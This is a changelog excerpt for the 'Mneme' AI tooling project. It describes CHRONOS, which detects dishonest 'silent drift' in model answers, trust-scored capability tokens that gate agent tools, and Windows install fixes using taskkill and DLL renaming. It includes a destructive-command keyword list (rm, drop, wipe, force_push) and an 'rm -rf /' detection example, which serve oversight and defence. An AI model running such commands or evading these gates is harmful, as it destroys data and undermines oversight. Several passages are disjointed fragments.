claims. CHRONOS removes the oracle. **The premise:** lying once is easy; lying *consistently* across 10,000 answers over six months is intractable for a stateless model — it would have to remember every lie. A truthful model re-derives from reality and needs no memory; a fabricating model must remember every fabrication or contradict itself. So honesty becomes **measurable from self-consistency across time alone.** **Mechanism:** every answer → HMAC-timestamp + semantic embed → append-only ledger; when a new answer's topic embed is near a past one (cosine ≥ threshold — 0.9 for a real embedder, empirically-calibrated 0.6 for the deterministic offline hash fallback) the stances are compared and classified into one of four verdicts: **COHERENT** (same stance — honest by construction; coherence++) · **LEGITIMATE_UPDATE** (stance changed *with* a new cited source — URL / X-post / commit / date — the world moved and the model tracked it) · **SELF_REPORTED** (changed and the model owned the change — failure-as-currency, rewarded) · **SILENT_DRIFT** 🚩 (changed with no evidence and no disclosure — the cardinal sin; temporal inconsistency = proof-of-dishonesty). **Score:** per-agent temporal-honesty 0-100 = Wilson lower-bound on consistent revisits × exponential silent-drift penalty (each hidden contradiction halves trust); bands PRISTINE / COHERENT / DRIFTING / INCONSISTENT. **6 deterministic modules:** `embed` (FNV-1a hash bag-of-features, L2-normalized, content-token-normalized + token-sorted topics so paraphrases collapse) · `evidence` (extracts x_post / url / commit / date / version / doc / pr_issue; the legit-vs-silent discriminator) · `stance` (homograph-canonicalized — ١٨٢ ≡ 182 via v2.71 guard — numeric-core comparison: differing numbers = conflict, matching numbers = same regardless of hedge words) · `drift_classifier` (most-topically-similar match → 4 verdicts + NO_MATCH) · `score` (Wilson-LB + exponential penalty) · `index` (record/check orchestration + per-agent + per-embedder isolation + HMAC-chained tamper-evident ledger). **The xAI / Grok weapon:** Grok's real-time X access means its answers *should* change — but nobody can tell "changed because the world changed" from "just waffled." CHRONOS requires every change to cite evidence (X-post URL + timestamp), else silent drift. Grok becomes the first AI that can cryptographically prove "I changed because the world changed, not because I'm fickle" — measurable maximal truth-seeking. **CLI 4 verbs** `mneme chronos record/check/score/audit` (record exits 1 on SILENT_DRIFT). **MCP 4 tools** `mneme.chronos.{record,check,score,audit}`. **TG BINDINGS (2 NEW, both severity=block):** `probe.chronos.four_verdict_round_trip` (the canonical 6-answer scenario classifies [NO_MATCH, COHERENT, LEGITIMATE_UPDATE, SILENT_DRIFT, SELF_REPORTED, NO_MATCH] + scores exactly 15/100 INCONSISTENT with 1 silent drift) · `probe.chronos.ledger_chain_intact`. **48 NEW PINNED TESTS** in `tests/regression/v74_0-chronos.test.ts` across 8 sections (K1 embed × 8 / K2 evidence × 6 / K3 stance × 7 / K4 classifier × 6 / K5 score-arithmetic × 7 / K6 pipeline+isolation+HMAC-tamper × 9 / K7 canonical scenario × 2 / K8 Grok killer-demo × 3). Triple-100 holds: **TRUTH GATE 57/57 = 100/100 · PEAK GAUNTLET 🏆 100/100 · LAUNCH WINDOW 🚀 T-0 GO.** **Paper abstract + usage + agent instructions** in README. **Pattern locked**: you can measure honesty WITHOUT an oracle by watching self-consistency across time — and the single discriminator between an honest update and silent drift is a *cited source*. Tag `v2.74.0`. |

Fix: **dual-window guard** — every route now enforces a per-minute sustained cap AND a per-second burst cap (polygraph = 600/min + 25/sec; ping = 6000/min + 200/sec; default = 60/min + 10/sec). Pre-fix: all 100 were 200. **Vuln #2 — Unicode-digit homograph on the HTTP path.** The HOMOGRAPH GUARD (v2.71) was only applied in the CLI command layer (`demo.ts`/`daemon.ts`); the HTTP polygraph path (`verifyBrowserSentence`) saw raw Arabic-Indic (٢), fullwidth (２), and other Unicode digits → `٢+٢=٥` slipped past the math lens (which only matches ASCII `\d`) and returned grey/unknown. Fix: canonicalize at the top of `verifyBrowserSentence` in the SHARED core engine — both the CLI and HTTP bridge now normalize on the same path, and lenses run on the canonical form. Fix: the 6 micro-lenses (deterministic, in-process, sub-ms) now run on EVERY non-empty sentence on the canonical form; a confident lens (math/risk/world-fact) can stand alone without ACGV. **Measured:** every claim now returns a 6-lens report (was 0); a generic sentence hiding `rm -rf /` is caught refuted/red by the risk lens; a short `2+2=5` is refuted by the math lens. **BONUS — wiring-lag false-positive fix (un-blocked LAUNCH WINDOW).** While verifying, the LAUNCH WINDOW was NO-GO from a pre-existing `wiring_lag` false positive: commit `8772f4e` (v2.70) literally says "CLI verb \`mneme grok\` (deferred — covered by SDK)" and the extractor flagged the deferred verb as broken-wiring. PASSPORT introduces **capability tokens**: an agent calls `mneme.capability.request {tool, agent, trust signals}`; Mneme fuses NEMESIS env-scan + verify_identity + HONEST_MIRROR weight + STEALTH score (inverted) + historical approval rate → 0..1 trust → checks against tier threshold (safe 0 / read 30 / write 60 / network 70 / **destructive 85%**) → either grants HMAC-signed token + TTL (5min-1h scaled by tier) or returns structured refusal with explainable per-signal trust breakdown. **Five wild innovations** that make this premium beyond a JWT: (1) **COMPOSED TRUST SCORE** (`passport/trust_score.ts`) — fuses 6 signals with per-signal weights; transparent breakdown for audit. Hand-written single-scores can be gamed; fused signals resist. Missing signals = neutral 0.5 (no penalty). (2) **CAPABILITY DELEGATION CHAIN** — `issuePassport({parent: parentToken, scope: subsetScope})` creates a CHILD passport with strictly-reduced scope. Child scope must be subset of parent (`parent_scope_violation` REFUSED otherwise). Verifier walks the chain for full attribution. (3) **HMAC-CHAINED AUDIT LEDGER** (`.mneme/passport/ledger.jsonl`) — every issue/verify/revoke event chains HMACs (each row's hmac = HMAC(prevHmac || canonical(row)) ). (4) **REVOCATION CASCADE** — `revokePassport({token, cascade:true})` (default) revokes the target AND every delegated descendant via the persisted delegation graph. Atomic propagation; no dangling permissions after vendor incident. cascade:false available when caller explicitly wants descendants preserved. (5) **CANONICAL JSON HMAC** — deterministic key sorting + undefined-key removal so HMAC is stable across language/runtime serializers. Catches the canonical-JSON-undefined bug that broke v1 prototype. **Risk classification heuristics** in `policy.ts` route `shell|exec|spawn|bash|cmd|rm|drop|truncate|delete_all|force_push|terminate|destroy|wipe|format` → destructive; `fetch|http|request|post|put|webhook|publish|email|sms` → network; `write|create|insert|update|patch|edit|mutate|append|commit|push` → write; `read|cat|stat|find|search|query|select|list|show` → read; rest → safe. **CLI surface** (5 verbs under `mneme capability`): `request --tool --agent [--tier --env-confidence --identity-verdict --hm-weight --stealth --history --scope --parent]` / `verify --token [--tool --scope]` / `revoke [--token|--jti] [--no-cascade]` / `audit [--limit]` / `policy`. ## v2.96.0 — HYDRA

**What it is (one line):** a context **codebook Mneme mines from its own corpus**, that is *signed*, *provably lossless*, and *works the same on every AI vendor*.

**Why it's different from the competition.** We researched the field first (LLMLingua, LoPace, AWS Meta-Tokens). Their game is **ratio** (compress 20×). They are *lossy* or *model-bound*. HYDRA does **not** play that game. Its value is the **cut**, not the carbon:

| Layer | What it guarantees | How it's measured |
|---|---|---|
| **L1 mine · L2 MDL** | the codebook is forged from Mneme's own corpus; a phrase earns a slot only if it pays back more bytes than it costs | bytes-saved, MDL gain |
| **L3 expand · L4 proof** | `compress → expand` is **byte-identical** | SHA-256 round-trip = a **boolean**, never "looks similar" |
| **L5 sign** | the codebook is **Ed25519-signed**, verifiable **offline** with the public key alone | sig valid + bound; tampering caught |
| **L6 vendor-neutral** | a deterministic engine expands it *before* any LLM sees it → tokenizer-independent **by construction** | works the same on Claude / GPT / Gemini / open |
| **L7 lattice** | no symbol holds two meanings (the same discipline as the axiom lattice) | collisions = **0** |
| **L8 energy** | mine once, recollect forever (the ANAMNESIS thesis) | signed savings certificate |
| **L9 live engine** | a super-bot keeps improving, **gating every step on lossless ∧ collision-free**, until it can't add a byte | converges; gauntlet = 100 or it refuses |

**Honest measurement (no boasting):** on the manifest the text-ratio is ≈**1.18×** and the **net single-shot bundle ratio is ≈1.06×** — reported plainly. The win is amortization (a pre-shared codebook reused across many expansions), *never* single-shot magic. The genuine, defensible novelty — confirmed by prior-art research — is the **composition** *signed × lossless × vendor-neutral on a cryptographic truth-spine*, which no prompt-compression system does.

**Use it:** `mneme hydra forge` (forge + sign + write `.mneme/hydra/codebook.json`) · `mneme hydra gauntlet` (audit → /100) · `mneme hydra verify <artifact>` (offline-verify a portable bundle). Probe: `probe.hydra.lossless_signed_portable`.

## v2.19.61 — 2026-05-19 — 🪄 DLL EVICTION ORGAN (the wild rename-sideways trick that ends EBUSY at SOURCE)

User audit (turn-22): "ทำไมปล่อยให้ส่งมาได้ ถ้าพังต้องแก้ คุณต้องเทสก่อนที่จะส่งให้ user เทสนะ และ วิเคราะห์ที EBUSY มันพังเพราะอะไร". User exposed my flaw: my v2.19.60 verification tested install in /tmp with NO daemon running — never the actual user scenario.

### 🩺 The actual root cause (user-diagnosed across 7 rounds; my prior fixes all missed)

```
Why EBUSY recurs:
1. daemon holds libvips-42.dll (via sharp) DURING npm install
2. preinstall calls `mneme daemon stop` → sends SIGTERM
3. Windows Node.js IGNORES SIGTERM by default (no handler installed)
4. Even if daemon dies, OS holds DLL handle 5-30s in "section close pending" state
5. npm tries to overwrite during that window → EBUSY
```

**Every fix from v2.19.45 to v2.19.58 used `process.kill(pid, 'SIGTERM')` or `mneme daemon stop` which Windows silently ignores.** My install_organ heartbeats + reapers all sent SIGTERM. The daemon didn't die. The DLL stayed locked.

### 🪄 THE FIX — DLL EVICTION ORGAN

[packages/core/src/dll_eviction/index.ts](packages/core/src/dll_eviction/index.ts) ships 4 composable primitives:

**1. `windowsTaskKill(processName)`** — uses `taskkill /F /IM <name> /T` which actually kills on Windows (TerminateProcess, not the ignored SIGTERM). The ONLY Windows-correct way to force-stop a Node.js daemon that isn't graceful. On POSIX falls back to `pkill -9`.

**2. `killPidForce(pid)`** — Windows: `taskkill /F /PID <pid>` ; POSIX: SIGKILL. Refuses self-kill (safety).

**3. `probeWritable(path, opts)`** — write-probe retry loop. `fs.openSync(path, 'r+')` until success. Proves the OS released the DLL handle. Default 60 × 500ms = 30s max wait. Cross-platform.

**4. `evictByRenameSideways(path)` — THE WILD ONE** — renames `<path>` to `<path>.locked-<ts>-<pid>`. Windows allows renaming a file with sharing-mode lock (which loaded DLLs have via FILE_SHARE_READ | FILE_SHARE_DELETE). The DLL stays loaded in any process that has it open (kernel still holds the inode/section) but the PATH is now free. **No process needs to die for this to work.** Same trick Windows Installer uses to update DLLs in use.

**Composed pipeline `evictAndProbe(path)`** — tries rename-sideways first; falls back to wait-for-handle-release. Sub-millisecond fast path when path doesn't exist or rename succeeds.

### 🛠 3 new MCP tools

| Tool | Purpose |
|---|---|
| `mneme.dll.evict` | Try rename-sideways then probe-wait fallback |
| `mneme.dll.probe` | Write-probe retry loop (post-kill verification) |
| `mneme.dll.sweep` | Clean `.locked-*` orphans + stale `.mneme-ai-*` dirs |

### 🛡 Preinstall hardened ([packages/cli/package.json](packages/cli/package.json))

OLD (v2.19.50-60): `process.kill(pid, 'SIGTERM')` × N — **Windows silently ignored**.

NEW (v2.19.61) — Windows-correct path:
1. Write install-incoming flag (5min window via v2.19.58 SHIELD)
2. Wait 300ms (daemon self-reap via v2.19.54 fs.watch)
3. **`taskkill /F /IM mneme.exe /T`** (the ACTUAL Windows kill)
4. For each heartbeat: **`taskkill /F /PID <pid> /T`** (Windows-correct per-PID)
5. **Rename each known libvips/sharp DLL sideways** (the wild trick — npm gets clean slate)
6. Sweep `.mneme-ai-*` staging dirs

POSIX path unchanged (SIGKILL fallback works correctly).

[.github/workflows/windows-install-smoke.yml](.github/workflows/windows-install-smoke.yml) now:

### 🛡 INSTALL SHIELD — the root fix at [packages/cli/src/autonomic_breath_hook.ts](packages/cli/src/autonomic_breath_hook.ts)

Two-layer respawn throttle:

**SHIELD 1 — install-incoming.flag (5-minute window)**:
```typescript
const flag = core.installOrgan.readInstallIncoming();
if (flag && typeof flag.announcedAt === "string") {
  const ageMs = Date.now() - new Date(flag.announcedAt).getTime();
  if (Number.isFinite(ageMs) && ageMs >= 0 && ageMs < 5 * 60 * 1000) {
    return { action: "throttled", ms: Date.now() - t0 };
  }
}
```

The preinstall hook writes `~/.mneme-global/install-incoming.flag` BEFORE doing anything else. The flag has `announcedAt` timestamp. Any CLI invocation within 5 minutes of the flag = automatic throttle = daemon stays dead. This bridges the ENTIRE npm install duration (typically 30-90s; 5min is generous safety margin).

**SHIELD 2 — heartbeat-mtime (2-second window, v2.19.56 cheap-probe)**:
Continues to handle the OTHER race (50 parallel CLI starts during normal operation).

3. Wait 300ms (daemon self-reaps via v2.19.54 fs.watch)

5. 5-step backoff: reap heartbeats + wait [100, 250, 500, 1000, 2000]ms

## v2.19.57 — 2026-05-18 — 🔮✨ DREAM ORGAN (self-installing pipeline) + END OF EBUSY FOREVER

User mandate (turn-18):
> "เมื่อไหร่ bug ebusy จะหมดไป ทำให้ มันเป็นสุดยอด engine ที่รันได้ด้วยตัวเองได้ไหม"

When will EBUSY end? When Mneme can run itself. v2.19.57 ships the **DREAM ORGAN** — a self-installing upgrade pipeline that ends EBUSY at SOURCE.

### 🔮 THE DREAM — Mneme upgrades ITSELF

User runs `mneme upgrade --execute`. Mneme:
1. Extracts a standalone CJS shepherd to `~/.mneme-global/shepherd/shepherd.cjs`
2. Spawns the shepherd DETACHED + unref'd
3. Caller exits (terminal can be closed)
4. Shepherd announces install-incoming flag (v2.19.54 protocol — daemon self-reaps)
5. Shepherd waits 800ms for daemon to die
6. Shepherd reaps any survivors via heartbeat registry (v2.19.53 protocol)
7. Shepherd waits 2000ms for OS handle release
8. Shepherd runs `npm install -g --omit=optional --force mneme-ai@<target>`
9. Shepherd verifies `mneme --version`
10. Shepherd spawns new daemon under new version
11. Shepherd clears install-incoming flag
12. Shepherd self-terminates

User polls progress via `mneme upgrade --status`. AI agents poll via `mneme.shepherd.status` MCP.

### 🔑 The root EBUSY fix at SOURCE: `--omit=optional`

v2.19.55 moved `@huggingface/transformers` to `optionalDependencies`. v2.19.57's shepherd EXPLICITLY passes `--omit=optional` to npm install. This means npm SKIPS transformers (and its transitive sharp/libvips native deps) entirely. **No DLL is installed → no DLL is locked → no EBUSY possible.**

Users opt INTO transformers later via:
```bash
npm install -g @huggingface/transformers
```

Mneme runtime detects (v2.19.55 OPTIONAL_NATIVE protocol) and uses WASM embedder when present; otherwise hash fallback.

### 📐 The protocol ([packages/core/src/shepherd/](packages/core/src/shepherd/))

**State ledger** (`~/.mneme-global/shepherd/upgrade-state.jsonl`): HMAC-chained `{v, ts, step, shepherdPid, targetVersion, details?, prevSig, sig}` per checkpoint. Steps: `starting → lock-acquired → announce-incoming → wait-for-self-reap → reap-survivors → wait-for-os → npm-install-start → npm-install-done → verify-new-version → spawn-new-daemon → clear-incoming-flag → release-lock → complete | failed`.

**Lock** (`~/.mneme-global/shepherd/.lock`): single-shepherd mutex. Auto-clears if (a) PID dead OR (b) mtime > 5min (stale shepherd).

**Resumable**: each step writes a checkpoint. If shepherd dies mid-way (OOM, power loss, anything), next invocation reads state + can resume.

**Tamper-detected**: `verifyStateChain()` checks HMAC chain. Composes with v2.19.34 APOSTILLE / v2.19.49 CHRONOSHEAF storage / v2.19.53 install-organ lineage / v2.19.56 perf budget — **5th HMAC chain in Mneme**.

**Parallel-safe**: 50 parallel `mneme upgrade --execute` invocations = 1 shepherd actually runs; 49 see "already running" early-exit.

### Standalone shepherd script (zero-deps CJS)

[`packages/core/src/shepherd/index.ts SHEPHERD_SCRIPT_SRC`](packages/core/src/shepherd/index.ts) is a JS string constant containing a 100% standalone CJS script. **Zero npm dependencies** — uses only `node:fs`, `node:path`, `node:os`, `node:crypto`, `node:child_process`. Critical because the package being upgraded is mid-replacement; we can't `require("@mneme-ai/core")` from the shepherd.

`installShepherdScript()` extracts the constant to `~/.mneme-global/shepherd/shepherd.cjs` (idempotent — overwrites every time so latest version always wins).

## v2.19.56 — 2026-05-18 — ⚡ P1 18× FIX (cheap-probe) + 🪙 PERF BUDGET LEDGER (WISDOM BONUS) + 🛡 RITUAL PHASE 3.10

User audit (turn-17 after v2.19.55 ship):
> "🚨 NEW REGRESSION — P1 latency กลับมา 18x. v2.19.52: 50 parallel = 1034ms (20.7ms/call). v2.19.54: 50 parallel = 18385ms (368ms/call). Hypothesis: INSTALL ORGAN heartbeat file fs contention."

The user nailed it. v2.19.53/54 shipped world-class fixes for the EBUSY orphan problem but **accidentally regressed P1 verify latency 18x** — classic "fix one thing → break another" pattern. Structural gates (phase 3.5-3.9) verify CORRECTNESS not LATENCY, so the regression passed publish.

### 🩺 Root cause

[autonomic_breath_hook.ts:91-103](packages/cli/src/autonomic_breath_hook.ts#L91) called `classifyHeartbeats()` on EVERY CLI startup. That function:
1. `readdirSync(heartbeatDir)` — list every beat file
2. `readFileSync(beat)` × N — parse each beat
3. `process.kill(pid, 0)` × N — liveness probe each PID

With 50 parallel `mneme verify` × N=10 beats = 500 reads + 500 kill probes competing for disk + signal syscalls. Wall time dominated.

### ⚡ ROOT FIX — cheap probe

[packages/core/src/install_organ/index.ts:312-329](packages/core/src/install_organ/index.ts#L312) adds `recentHeartbeatActivity(thresholdMs)`:

```typescript
export function recentHeartbeatActivity(thresholdMs: number, now: number = Date.now()): boolean {
  try {
    const dir = heartbeatDir();
    if (!existsSync(dir)) return false;
    const st = statSync(dir);
    return (now - st.mtimeMs) < thresholdMs;
  } catch { return false; }
}
```

Single `statSync` (~1ms). If ANY heartbeat was written in the last `thresholdMs`, the dir mtime reflects it — sufficient for the throttle decision. autonomic_breath_hook now uses this. Expensive `classifyHeartbeats()` only runs from MCP diagnostic tools where the rich data is needed.

**Plus**: heartbeat WRITE made async (fire-and-forget). First write stays sync so `listHeartbeats()` sees this process immediately; subsequent periodic beats use `writeFile` callback-style — daemon event loop never blocks.

### 🪙 WISDOM BONUS — `perf_budget` module

The user identified the missing meta-invariant:
> "ทีมเคยขยาย CI ritual phase 3.6/3.7/3.8 ป้องกัน bug class — ตอนนี้ควรเพิ่ม phase 3.9: stress regression"

[packages/core/src/perf_budget/index.ts](packages/core/src/perf_budget/index.ts) ships a cross-release perf accountability primitive:

- `PerfBudget` — `{name, baselineMs, ceilingMs, sampleN, regressionPct?}` per metric
- `PerfMeasure` — `{ts, version, durationsMs[], p50, p99, mean, passed, prevSig, sig}` per release
- `recordMeasure()` — append HMAC-chained entry to `.mneme-perf-budget.jsonl` (composes with v2.19.34 APOSTILLE)
- `regressionGate()` — two-sided check: hard ceiling AND >10% relative regression vs prior baseline
- `verifyLedgerChain()` — tamper detection on the ledger
- `P1_BUDGETS` — catalog (verify-50-parallel-identical / verify-50-parallel-distinct / cli-startup)

Every release writes its baseline. Future releases that regress are blocked at publish.

### 🛡 RITUAL PHASE 3.10 — STRESS REGRESSION GATE

[scripts/reincarnation-ritual.mjs phase 3.10](scripts/reincarnation-ritual.mjs#L387) spawns a sub-process that runs 50-parallel `withVerifyCache(forensicVerify)` against the installed tarball + measures wall-time. Hard ceiling: **3000ms** (user's wisdom). On pass, records to ledger for next release's regression check.

**6-layer publish defense now**: phase 3.5 DOGFOOD + 3.6 preinstall-no-self-ref + 3.7 binary-executes + 3.8 catalog-shape + 3.9 zero-native-default + **3.10 stress-regression**.

## v2.19.54 — 2026-05-18 — 🪄✨ PREDICTIVE INSTALL SIGNAL + EXPONENTIAL-BACKOFF PROBE + MAGICAL UPGRADE PIPELINE

User wisdom (turn-15 after v2.19.53 audit):
> "🟡 EBUSY ยังเกิดเป็นครั้งคราว ครั้งแรก (recover ใน retry). Wisdom: เพิ่ม retry mechanism ใน preinstall (5 attempts × 2s backoff) → eliminate 99%"

v2.19.54 ships the retry — plus 2 wild innovations that compound on v2.19.53's INSTALL ORGAN.

### 🪄 INNOVATION #1 — PREDICTIVE INSTALL SIGNAL (the daemon volunteers to die)

The wild idea: instead of REACTIVELY killing the daemon DURING `npm install` (which races with autonomic respawn), let the installer PROACTIVELY announce "install incoming" via a flag file. Daemon's `fs.watch` sees the flag within ~50ms and SELF-REAPS through its existing SIGTERM handler.

**Implementation** ([packages/core/src/install_organ/index.ts:481-525](packages/core/src/install_organ/index.ts#L481)):
- `announceInstallIncoming(reason, expectedVersion?)` writes `~/.mneme-global/install-incoming.flag` (HMAC v1, announcerPid, announcedAt, reason, expectedVersion).
- Daemon at [daemon.ts:155-175](packages/cli/src/commands/daemon.ts#L155) installs an `fs.watch(organDir, ...)` handler that triggers `process.kill(process.pid, "SIGTERM")` on flag creation. Existing SIGTERM handler already reaps children + cleans up.
- `clearInstallIncoming()` removes the flag after install completes (idempotent).
- `readInstallIncoming()` peeks at the flag for diagnostics.

**Why this is genuinely magical**: ZERO orphan because daemon dies BEFORE npm extracts the new tarball. The race condition that caused EBUSY across v2.19.45-53 is structurally impossible now — there's nothing alive to hold libvips-42.dll when npm starts extracting.

Cross-platform via plain `fs.watch` — Windows + macOS + Linux.

### ⚡ INNOVATION #2 — EXPONENTIAL-BACKOFF DLL PROBE RETRY

User asked for 5 attempts × 2s backoff (= 10s flat). v2.19.54 ships 6 attempts with adaptive backoff:

| Attempt | Wait | Cumulative |
|---|---|---|
| 0 (fast path) | 0 | 0ms |
| 1 | 100ms | 100ms |
| 2 | 250ms | 350ms |
| 3 | 500ms | 850ms |
| 4 | 1000ms | 1850ms |
| 5 | 2000ms | 3850ms |
| 6 | 4000ms | 7850ms |

**Fast case** (nothing locked): exits in <1ms. **Worst case**: 7.85s — STILL FASTER than user's proposed flat 5×2s=10s.

Per attempt re-runs the reaper (orphans may respawn between attempts) + re-probes all paths. As soon as everything is writable, returns `{ok: true, attempts, totalWaitMs, finalProbes, reapPerAttempt}`.

`backoffProbeAndReap(probedPaths, opts?)` ([packages/core/src/install_organ/index.ts:553-590](packages/core/src/install_organ/index.ts#L553)) — generic; works for any path list cross-platform.

### ✨ INNOVATION #3 — MAGICAL UPGRADE PIPELINE (`runUpgradePipeline`)

The user-facing one-call composer that does the whole ceremony:

1. **Stage 1 — announce**: write the install-incoming flag.
2. **Stage 2 — waitForSelfReap**: 300ms wait so daemon's fs.watch handler can act (configurable).
3. **Stage 3 — heal**: full v2.19.53 heal (diagnose + reap + reprobe).
4. **Stage 4 — backoff**: exponential probe + retry loop if heal still leaves locks.
5. **Stage 5 — report**: structured ok/failure with stage-by-stage breakdown.

Returns `UpgradePipelineResult` with `recommendation` string ready to show users. AI agents call `mneme.install.upgrade_pipeline` MCP tool; caller then runs `npm install -g --force mneme-ai@latest` only when `ok: true`.

### 🛠 3 NEW MCP TOOLS

| Tool | Purpose |
|---|---|
| `mneme.install.announce` | Write the install-incoming flag (daemons watch + self-reap) |
| `mneme.install.clear_announce` | Remove the flag (idempotent; call after install completes) |
| `mneme.install.upgrade_pipeline` | The one-call magic install ceremony |

Total MCP tools: 759 → **762 (+3)**.

### 🪞 ENHANCED PREINSTALL (the inline hook becomes magical)

[packages/cli/package.json](packages/cli/package.json) `scripts.preinstall` extended:

```
(a) Create ~/.mneme-global/ if missing
(b) Write install-incoming.flag (daemons fs.watch this)
(c) Wait 300ms for daemons to self-reap
(d) spawnSync `mneme daemon stop` (catch survivors)
(e) 5-step backoff loop: each step reads heartbeats + SIGTERMs each PID
    + removes beat file + waits [100, 250, 500, 1000, 2000] ms
```

Total worst-case wall time: 300ms (wait) + 8s (daemon stop) + 3850ms (backoff) ≈ **12.15s worst case**, but typically **300-500ms** because daemon self-reaps almost instantly.

**Still ZERO file refs to package internals** — chicken-and-egg safe per v2.19.50 phase 3.6 ritual gate.

## v2.19.53 — 2026-05-18 — 🪄 INSTALL ORGAN (self-healing cross-platform process-lineage protocol)

User mandate (turn-14 after v2.19.52 audit):
> "EBUSY บน Windows ยังกลับมา แม้ใน v2.19.52 (preinstall hook fix รอบ v48-49 ดูเหมือนยังไม่จัดการ DLL lock จริง) หลัง mneme daemon stop ยัง orphan node processes ค้าง 10+ ตัว (tasklist) — daemon child processes ไม่ถูก reaped... Windows install pipeline ที่ทำซ้ำได้ ==> คิด สุดยอดนวัตกรรมเจ๋งระดับ world class... และต้องลองรับ mac os ด้วยนะ นวัตกรรม pipeline ที่คิดต่าง แกะดำ ทำให้ระบบบน mac os คือสุดยอด"

User asked for: world-class innovation; cross-platform (Windows + macOS); black-sheep idea; magical / smooth / never breaks. v2.19.53 ships it.

### 🔴 The problem (recurring across v2.19.45 / .48 / .51 / .52)
`mneme daemon stop` only killed the main daemon process. **10+ orphan node.exe processes survived** (sources discovered via R&D in v2.19.53):
1. Daemon detached spawn at [daemon.ts:353-359](packages/cli/src/commands/daemon.ts#L353) — `detached: true` + `.unref()`
2. Autonomic respawn at [autonomic_breath_hook.ts:92](packages/cli/src/autonomic_breath_hook.ts#L92) — every CLI command respawns detached if daemon dead (race during stop)
3. Index subprocess at [daemon.ts:256](packages/cli/src/commands/daemon.ts#L256) — `spawnSync("mneme index")` inherits DLL handles
4. Nucleus daemon — separate orphan family
5. MCP servers — multiple AI clients each spawn one
6. No PID registry, no child reaping, no respawn throttle

Each orphan held libvips-42.dll / sharp / zod handles → npm install EBUSY.

### 🪄 The fix — INSTALL ORGAN (the self-healing process-lineage protocol)

A new core module [packages/core/src/install_organ/](packages/core/src/install_organ/) ships 6 composable primitives + 5 MCP tools + 1 enhanced preinstall.

**1. Heartbeat registry** — every Mneme-spawned node process writes a JSON beat file to `~/.mneme-global/heartbeats/{pid}.beat` with `{v, pid, ppid, role, startedAt, beatAt, cwd, host, platform, holdsPaths?}`. Refreshed every 5s by a `setInterval(...).unref()` so the event loop isn't blocked. On clean exit (SIGTERM handler), the beat file is deleted + an "exit" event appended to lineage. Roles: `daemon | daemon-attached | autonomic-respawn | indexer | mcp-server | nucleus | child-script`.

**2. Lineage ledger** — `~/.mneme-global/lineage.jsonl` is an append-only HMAC-chained record of every spawn / exit / orphan-reaped / heartbeat-stale event. Each entry: `{v, ts, event, pid, role, parentPid?, reason?, prevSig, sig}`. `verifyLineage()` detects tampering at any position. Same chain pattern as v2.19.34 APOSTILLE / ETERNITY / v2.19.49 CHRONOSHEAF storage — composes across all 4 subsystems.

**3. Classifier** — `classifyHeartbeats()` returns each beat as `alive` (beatAt < 15s old + PID alive), `stale-but-alive` (beat > 15s but PID alive → likely orphan), or `tombstone` (PID dead → beat file is just a marker). Cross-platform liveness via `process.kill(pid, 0)` probe.

**4. DLL/dylib lock probe** — `probeLockable(path)` opens for read+write. EBUSY/EPERM = locked. On macOS/Linux ALSO spawns `lsof -t {path}` to identify holding PIDs (Windows lacks lsof; relies on heartbeat registry to identify Mneme holders). Returns `{path, writable, reason?, holdingPids?}`.

**5. Reaper** — `reapMnemeProcesses(opts)` iterates the heartbeat registry and reaps every Mneme PID by **exact PID** with SIGTERM → grace period (default 1000ms) → SIGKILL. **SURGICAL not nuclear** — only kills PIDs Mneme itself registered. Never touches the user's editor / Claude Code / Cursor / build watcher. Removes beat files on success + appends `orphan-reaped` event to lineage. `dryRun: true` mode reports what WOULD be killed without acting. `skipPid: process.pid` prevents the caller from self-reaping.

**6. Diagnose + Heal pipelines** — `diagnoseInstall(probedPaths)` composes classifier + lineage + probes into a one-call structured report with `{ok, heartbeats: {total, alive, staleButAlive, tombstones}, lineage: {chainOk}, probes: [...], recommendation}`. `healInstall(probedPaths, opts)` runs diagnose → reap → wait 1.5s → re-probe → return `{ok, reap: {killed, failed}, postProbes, remediation: [...]}`. The full magic pipeline in one call.

### Cross-platform magic

| Capability | Windows | macOS | Linux |
|---|---|---|---|
| Heartbeat protocol | ✓ | ✓ | ✓ |
| HMAC lineage ledger | ✓ | ✓ | ✓ |
| SIGTERM/SIGKILL via process.kill | ✓ | ✓ | ✓ |
| Reaper (surgical) | ✓ | ✓ | ✓ |
| DLL probe `fs.openSync(path, 'r+')` | ✓ libvips-42.dll | ✓ libvips.42.dylib | ✓ libvips.so.42 |
| `lsof -t` holder detection | ✗ (no lsof) | ✓ | ✓ |
| SIGUSR2 graceful handoff | ✗ (Windows lacks SIGUSR2) | ✓ | ✓ |
| Platform-aware probe paths | ✓ sharp-libvips-win32-x64 | ✓ sharp-libvips-darwin-{arm64,x64} | ✓ sharp-libvips-linux-x64 |

### The wiring (3 spawn sites + 1 stop handler + 1 preinstall)

1. **[daemon.ts:140](packages/cli/src/commands/daemon.ts#L140) runDaemonLoop**: `process.title = "mneme-daemon-{pid}"` + `registerHeartbeat("daemon-attached")` on start.

2. **[daemon.ts:300-320](packages/cli/src/commands/daemon.ts#L300) shutdown handler**: `reapMnemeProcesses({skipPid: process.pid, gracePeriodMs: 800})` BEFORE `process.exit(0)`. Reaps all children before dying. Plus `SIGUSR2` handler installed on POSIX for future zero-downtime upgrade.

3. **[autonomic_breath_hook.ts:90-110](packages/cli/src/autonomic_breath_hook.ts#L90) respawn throttle**: before spawning a new detached daemon, check `classifyHeartbeats()` for any daemon-role beat < 2s old + PID alive → return `{action: "throttled"}` instead of respawning. **Kills the 10-orphan storm at source** when multiple CLI commands run in parallel during a stop.

4. **[packages/cli/package.json scripts.preinstall](packages/cli/package.json)**: enhanced inline node -e now (a) stops daemon (existing), (b) reads `~/.mneme-global/heartbeats/` + SIGTERMs each PID + removes beat file, (c) waits 1.5s for OS to release handles. Still ZERO file refs to package internals (chicken-and-egg safe per v2.19.50 phase 3.6).

### Per-entry TTL fix in verify_cache

Found while writing cache_coalesce tests: a put with `ttlMs: 50` followed by a get with the default `ttlMs: 5000` returned the entry as fresh up to 5000ms (the read's TTL won). That's wrong cache semantics — writes should honor their own TTL.

[packages/core/src/verify_cache/index.ts](packages/core/src/verify_cache/index.ts) MemoEntry now stores `ttlMs` at write time. Read freshness check uses `Math.min(storedTtl, readTtl)` — neither side can extend, both can shorten. Backwards-compatible because internal callers always pass the same ttl on every call.

**Root cause** (user hypothesis was CHRONOSHEAF; ACTUAL cause was 3 uncached hot paths):

50 parallel verifies = 50 × (catalog rebuild + filesystem walk + pipeline run) — the disk walks were the dominant cost, hitting concurrent I/O scheduler.

**Three fixes at SOURCE:**

